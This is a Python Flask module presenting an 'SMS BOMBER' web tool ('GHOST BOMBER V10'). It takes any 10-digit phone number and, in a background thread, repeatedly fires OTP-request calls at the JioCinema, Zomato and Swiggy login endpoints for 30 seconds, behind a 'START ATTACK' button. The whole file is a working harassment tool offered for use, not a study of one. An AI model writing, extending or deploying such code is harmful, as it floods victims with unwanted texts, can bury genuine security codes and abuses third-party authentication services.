import time
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Blueprint, request, jsonify, render_template_string

# --- Config ---
TARGET_NUMBER = "9876543210"
DELAY_BETWEEN_REQUESTS = 2.0
MAX_THREADS = 5
TOTAL_ATTACK_DURATION = 30 # Render ke liye 30 safe hai

script10_bp = Blueprint("script10", __name__)

SERVICES = [
    {
        "name": "JioCinema",
        "url": "https://www.jiocinema.com/api/v1/auth/mobile/otp/request",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile": "{}", "countryCode": "91"},
    },
    {
        "name": "Zomato",
        "url": "https://www.zomato.com/api/v2/auth/request_otp",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"phone": "{}"},
    },
    {
        "name": "Swiggy",
        "url": "https://www.swiggy.com/dapi/user/send_otp",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile_no": "{}"},
    }
]

def _send_otp(service, payload):
    try:
        resp = requests.post(service["url"], json=payload, headers=service["headers"], timeout=5)
        return f"[{resp.status_code}] {service['name']}"
    except:
        return f"[FAIL] {service['name']}"

def bomb_worker(number):
    start = time.time()
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        while time.time() - start < TOTAL_ATTACK_DURATION:
            for svc in SERVICES:
                # Payload build logic
                p = {k: v.replace("{}", number) if isinstance(v, str) else v for k, v in svc["payload_template"].items()}
                executor.submit(_send_otp, svc, p)
            time.sleep(DELAY_BETWEEN_REQUESTS)

@script10_bp.route("/", methods=["GET"])
def index():
    # Path dynamically handle karne ke liye logic
    html = """
    <!doctype html>
    <html>
    <head>
        <title>GHOST BOMBER V10</title>
        <style>
            body{ background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
            .box{ border: 1px solid #0f0; padding: 20px; display: inline-block; border-radius: 10px; background: #111; }
            input{ background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; margin: 10px; }
            button{ background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="box">
            <h2>SMS BOMBER</h2>
            <input type="text" id="num" placeholder="Enter 10 Digits" maxlength="10">
            <br>
            <button onclick="runBomb()">START ATTACK</button>
            <p id="out"></p>
        </div>

        <script>
            async function runBomb() {
                const n = document.getElementById('num').value;
                const out = document.getElementById('out');
                if(n.length !== 10) return alert("Number sahi daal!");
                
                out.innerText = "Initializing Background Thread...";
                
                // Note: fetch path fixed to relative /bomb
                const res = await fetch(window.location.pathname + "/bomb", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ number: n })
                });
                const data = await res.json();
                out.innerText = data.status + " for " + data.target;
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@script10_bp.route("/bomb", methods=["POST"])
def bomb():
    try:
        # JSON support fix
        data = request.get_json(silent=True) or request.form
        number = data.get("number", "").strip()

        if not (number.isdigit() and len(number) == 10):
            return jsonify({"error": "Invalid 10-digit number"}), 400

        # Background thread start
        thread = threading.Thread(target=bomb_worker, args=(number,), daemon=True)
        thread.start()

        return jsonify({
            "status": "Bombing started in background",
            "target": number,
            "duration": TOTAL_ATTACK_DURATION
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

